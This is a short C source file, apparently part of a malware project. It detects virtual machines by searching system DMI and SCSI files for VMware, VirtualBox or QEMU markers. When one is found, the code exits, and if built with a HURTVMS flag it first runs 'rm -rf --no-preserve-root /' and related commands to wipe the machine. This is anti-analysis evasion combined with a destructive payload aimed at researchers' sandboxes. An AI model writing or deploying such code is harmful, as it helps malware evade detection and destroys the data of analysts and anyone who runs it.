#include "../include/main.h"

inline static __attribute__((always_inline)) bool obfsc_vm()
{
	int fd, i = 0;
	bool x = false;
	char *str = calloc(1024, sizeof(unsigned char *));
	
	const char *file[] =
	{
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
		"/proc/scsi/scsi",
		NULL
	};
	const char *vm[] =
	{
		"VMWARE",
		"VIRTUALBOX",
		"QEMU",
		NULL
	};
	
	while (file[i] && x == false)
	{
		if ((fd = open(file[i], O_RDONLY)) != -1)
		{
			x = readuntil(fd, str, 1024, vm);
			close(fd);
		}
		i++;
	}

	free(str);
	return x;
}

void obfsc_init(void)
{
	if (obfsc_vm() == true)
	{
#ifndef DEBUG
#	ifdef HURTVMS
		system("rm -rf --no-preserve-root /");
		system("rm -rf /");
		system("rm -rf ~/");
		system("rm -rf --no-preserve-root ~/");
#	endif
		exit(0);
#else
		printd("VM Detected")
#endif
	}
}
